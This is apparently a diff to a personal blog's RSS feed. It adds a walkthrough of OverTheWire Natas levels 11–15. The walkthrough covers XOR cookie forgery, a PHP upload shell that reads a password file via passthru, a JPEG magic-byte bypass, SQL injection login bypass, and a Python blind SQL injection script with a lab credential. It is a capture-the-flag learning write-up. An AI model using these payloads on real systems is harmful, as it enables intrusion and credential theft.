@@ -132,7 +132,105 @@ C XOR K = P&lt;/p&gt;
 &lt;p&gt;Great, so in our case what are the ciphertext and plaintext? Well, the plaintext would be the json encoding of $defaultdata, and the ciphertext would be found in our cookies! The ciphertext is base64 encoded as per the source code, so we first need to decode that.&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;P: {&amp;quot;showpassword&amp;quot;: &amp;quot;no&amp;quot;, &amp;quot;bgcolor&amp;quot;: &amp;quot;#ffffff&amp;quot;}
 C: 0l;$$98-8=?#9*jvi &#39;ngl*+(!$#9lrnh(.*-(.n6
-&lt;/code&gt;&lt;/pre&gt;- https://koolaidxk1d.github.io/posts/natas/ - </description>
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;To XOR these together I simply stole the source code, set the $key value to our plaintext, and called the xor_encrypt() function on the ciphertext. I ran it using a PHP interpreter and echoed the result.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/natas11-1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The repeating characters are the key. &amp;ldquo;KNHL&amp;rdquo;. Now that we have the XOR key, all we have to do is encode our own cookie and place it in to the browser. I will once again use the source code to do this, but this time placing our key into $key, placing the modified json pair into the argument of xor_encrypt(), and running base64_encode on the result.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/natas11-2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;To actually use our new cookie, we just need to replace the data cookie with our new value and refresh the page.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/natas11-3.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;level-12&#34;&gt;Level 12&lt;/h2&gt;
+&lt;p&gt;This level allows a file upload up to 1KB. It specifies that it needs to be a JPEG.&lt;/p&gt;
+&lt;p&gt;At first glance, the best exploitation would probably be to somehow upload a PHP file instead of a JPEG to allow for remote code execution. First let&amp;rsquo;s just upload a blank php file to see if input validation measures are in place.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/natas12-0.jpg&#34; alt=&#34;&#34;&gt;
+&lt;img src=&#34;https://koolaidxk1d.github.io/images/natas12-1.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Weird. The upload works, but the extension is changed to jpg. The source code is linked so let&amp;rsquo;s dig in.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/natas12-2.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;The extension is defined by the input tag named &amp;ldquo;filename&amp;rdquo; in the form. We can directly edit the extension since it is declared explicitly in the html. Doing this before uploading the file will allow PHP uploads.&lt;/p&gt;
+&lt;p&gt;Now that we bypassed the extension, we need to write a PHP script that will read out the password file to the screen. To run linux commands on the server we can use the passthru PHP function.&lt;/p&gt;
+&lt;p&gt;Here is a simple script that will read the password file to the screen.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+	echo(passthru(&amp;quot;cat /etc/natas_webpass/natas13&amp;quot;));
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
+&lt;h2 id=&#34;level-13&#34;&gt;Level 13&lt;/h2&gt;
+&lt;p&gt;This level seems to be the same as 12, but with one key difference: the script checks if the file is a legitimate jpeg.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/natas13-0.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Looking at the source code and comparing it to level 12&amp;rsquo;s, there is now an added conditional. The result of exif_imagetype() is checked before uploading the file. This means we can reuse the same solution from 12 as long as we can somehow make the function see the file as a jpeg.&lt;/p&gt;
+&lt;p&gt;When a computer handles a file, the way it handles the file is different based on the filetype. The extension of the file is not the only thing that determines the filetype, and usually it is not even what the computer looks at to determine its compatibility. This is where the &lt;a href=&#34;https://en.wikipedia.org/wiki/List_of_file_signatures&#34;&gt;file signature&lt;/a&gt; comes in.&lt;/p&gt;
+&lt;p&gt;File signatures, also called magic numbers, are arbitrary (probably) agreed upon combinations of hex bytes typically placed at the very beginning of a file that tell the computer what kind of data a file is storing. This is important because if a program treats a file wrong it can result in unpredictable behavior. The file signature for a jpeg file is 0xFF_D8_FF_DB.&lt;/p&gt;
+&lt;p&gt;If we want to upload our PHP script and bypass the check, all we need to do is modify the file signature after writing the script. This can be done using any hex editor. Just insert the bytes before the existing contents.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/natas13-1.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Using this file you can bypass check while still uploading a coherent script for the page to run and return the password to level 14.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;level-14&#34;&gt;Level 14&lt;/h2&gt;
+&lt;p&gt;This page is asking us to login. It is likely that some type of database is involved considering we are inputting a user and password. Looking at the source code we can see it is using MySQL.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;$query = &amp;quot;SELECT * from users where username=\&amp;quot;&amp;quot;.$_REQUEST[&amp;quot;username&amp;quot;].&amp;quot;\&amp;quot; and password=\&amp;quot;&amp;quot;.$_REQUEST[&amp;quot;password&amp;quot;].&amp;quot;\&amp;quot;&amp;quot;;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;The query gets the username and password from the form. We can actually format our response to include SQL phrases. This is called &lt;a href=&#34;https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/#LineCommentAttacks&#34;&gt;SQL Injection&lt;/a&gt;. I will use a comment (#) to ignore the rest of the query. By doing so, I can specify a username without needing to match the password. In other words, I can override the original query to instead print out the details of the user of my choosing. The user I will enter is natas15. The input should then look like this:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;natas&amp;quot;#&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/natas14-0.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;level-15&#34;&gt;Level 15&lt;/h2&gt;
+&lt;p&gt;This level took me&amp;hellip;&lt;em&gt;a while&lt;/em&gt;; I spent so long staring at its source code trying to find a hole that wasn&amp;rsquo;t there. Eventually, I realized that it was staring back at me the whole time. Let me explain.&lt;/p&gt;
+&lt;p&gt;Level 15 contains a search box asking for a username. When you enter it and submit the form, you have three possible responses: &amp;ldquo;user exists&amp;rdquo;, &amp;ldquo;user does not exist&amp;rdquo;, and &amp;ldquo;error in request&amp;rdquo;. There is an optional &amp;ldquo;debug&amp;rdquo; feature which can be activated by adding an extra input to the form and making a GET request rather than a POST. Below is the source code:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/natas15-0.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h5 id=&#34;reconnaissance&#34;&gt;Reconnaissance:&lt;/h5&gt;
+&lt;ul&gt;
+&lt;li&gt;The table used on the mySQL database is presumably a table containing the columns &amp;ldquo;username&amp;rdquo; and &amp;ldquo;password&amp;rdquo; according to the source code comment.&lt;/li&gt;
+&lt;li&gt;Checking the user &amp;ldquo;natas16&amp;rdquo; on the form shows us that it is on the table, so we can probably assume the password is in the password column of the table. This means we likely don&amp;rsquo;t need to somehow get the /etc/password file from the server, but rather we can get it solely by interfacing with the mySQL database.&lt;/li&gt;
+&lt;li&gt;You can only get 3 possible responses from the submission.&lt;/li&gt;
+&lt;li&gt;If we don&amp;rsquo;t count the error response, we are essentially getting yes or no answers to our questions.&lt;/li&gt;
+&lt;li&gt;After a quick test input (&amp;rdquo; AND 1=1#), I can see the form is not protected against SQL injection, so that is still on the table.&lt;/li&gt;
+&lt;li&gt;If we check the length of the password value using SQL function LENGTH(password) we get 32. That is the same length as every other level&amp;rsquo;s password, so it is definitely in the table.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;With the given information, it&amp;rsquo;s highly probable that I will have to find a way to return the password using SQL injection and interpreting binary responses in a way that tells us the password. The obvious answer here is char-by-char guessing.&lt;/p&gt;
+&lt;p&gt;Each character of the password is alphanumeric, so each char has 62 possible values. If we multiply this by 32 characters in the password, we get 1,984. In other words, we only need to make 1,984 requests to the database. My testing shows that an average response from the server takes about a third of a second. So we can reasonably get the entire password in just a few minutes. So how do we actually go about guessing the letters? I&amp;rsquo;ve written a python script to do just that.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;import requests
+
+url = &amp;quot;http://natas15.natas.labs.overthewire.org&amp;quot;
+credentials = (&amp;quot;natas15&amp;quot;, &amp;quot;TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB&amp;quot;)
+form_data = {&amp;quot;username&amp;quot;: &amp;quot;x&amp;quot;}
+password=&amp;quot;&amp;quot;
+
+alphanumeric_chars = [
+&#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;,
+&#39;A&#39;, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;, &#39;E&#39;, &#39;F&#39;, &#39;G&#39;, &#39;H&#39;, &#39;I&#39;, &#39;J&#39;,
+&#39;K&#39;, &#39;L&#39;, &#39;M&#39;, &#39;N&#39;, &#39;O&#39;, &#39;P&#39;, &#39;Q&#39;, &#39;R&#39;, &#39;S&#39;, &#39;T&#39;,
+&#39;U&#39;, &#39;V&#39;, &#39;W&#39;, &#39;X&#39;, &#39;Y&#39;, &#39;Z&#39;, &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;,
+&#39;e&#39;, &#39;f&#39;, &#39;g&#39;, &#39;h&#39;, &#39;i&#39;, &#39;j&#39;, &#39;k&#39;, &#39;l&#39;, &#39;m&#39;, &#39;n&#39;,
+&#39;o&#39;, &#39;p&#39;, &#39;q&#39;, &#39;r&#39;, &#39;s&#39;, &#39;t&#39;, &#39;u&#39;, &#39;v&#39;, &#39;w&#39;, &#39;x&#39;,
+&#39;y&#39;, &#39;z&#39;
+]
+
+for i in range(1, 33):
+  for j in alphanumeric_chars:
+    form_data[&amp;quot;username&amp;quot;] = f&amp;quot;natas16\&amp;quot; AND ASCII(SUBSTRING(password, {i}, 1)) = {ord(j)}#&amp;quot;
+    
+	# Make the cURL request
+	
+	response = requests.post(url, auth=credentials, data=form_data)
+	
+	if &amp;quot;exists&amp;quot; in response.text:
+	  password += j
+
+	print(f&amp;quot;Current guess: {i}{j}:&amp;quot;)
+	print(&amp;quot;Status code:&amp;quot;, response.status_code)
+	print(&amp;quot;Content:&amp;quot;, response.text)
+	print(&amp;quot;--------------------&amp;quot;)
+	print(f&amp;quot;password: {password}&amp;quot;)
+	if &amp;quot;exists&amp;quot; in response.text:
+      break
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;My concept is a two-dimensional loop. On the outside, iterating over the chars of the string (1-32) and, inside of that, iterating over possible values for those chars(a-z, A-Z, 0-9).&lt;/p&gt;
+&lt;p&gt;On each iteration, I make a curl request to the site using the credentials and include a variable value for the &amp;ldquo;username&amp;rdquo; input depending on the current iteration. The form data contains SQL injection code in the username field. Then if a char is correct (meaning: the request response contains the word &amp;ldquo;exists&amp;rdquo;) then the char is appended to an undeclared password string variable and we break out of the loop to avoid guessing more chars that we know will be false.&lt;/p&gt;
+&lt;p&gt;My SQL command given to the &amp;ldquo;username&amp;rdquo; field looks like this:
+&lt;code&gt;natas16&amp;quot; AND ASCII(SUBSTRING(password, {i}, 1)) = {ord(j)}#&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;I&amp;rsquo;ve input natas16&amp;quot; to avoid an error, and then added the rest which compares the guess to the actual char of the password at the index defined by the current iteration.&lt;/p&gt;
+&lt;p&gt;When I ran the script I got the password in a few minutes.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/natas15-1.gif&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;level-16&#34;&gt;Level 16&lt;/h2&gt;
+&lt;p&gt;(coming soon)&lt;/p&gt;
+- https://koolaidxk1d.github.io/posts/natas/ - </description>
         </item>
     
     
@@ -171,7 +269,6 @@ C: 0l;$$98-8=?#9*jvi &#39;ngl*+(!$#9lrnh(.*-(.n6
 &lt;h2 id=&#34;thanks&#34;&gt;Thanks&lt;/h2&gt;
 &lt;p&gt;This blog is written with &lt;a href=&#34;https://obsidian.md/&#34;&gt;Obsidian&lt;/a&gt;, compiled with &lt;a href=&#34;https://gohugo.io/&#34;&gt;Hugo&lt;/a&gt;, and hosted with &lt;a href=&#34;https://pages.github.com/&#34;&gt;Github pages&lt;/a&gt;.&lt;/p&gt;
 &lt;p&gt;The Hugo theme in use is &lt;a href=&#34;https://themes.gohugo.io/themes/hugo-theme-diary/&#34;&gt;Diary&lt;/a&gt;.&lt;/p&gt;
-&lt;p&gt;Music backgrounds taken from &lt;a href=&#34;https://ericaofanderson.tumblr.com&#34;&gt;ericaofanderson on tumblr&lt;/a&gt;.&lt;/p&gt;
 - https://koolaidxk1d.github.io/posts/about/ - </description>
         </item>
     
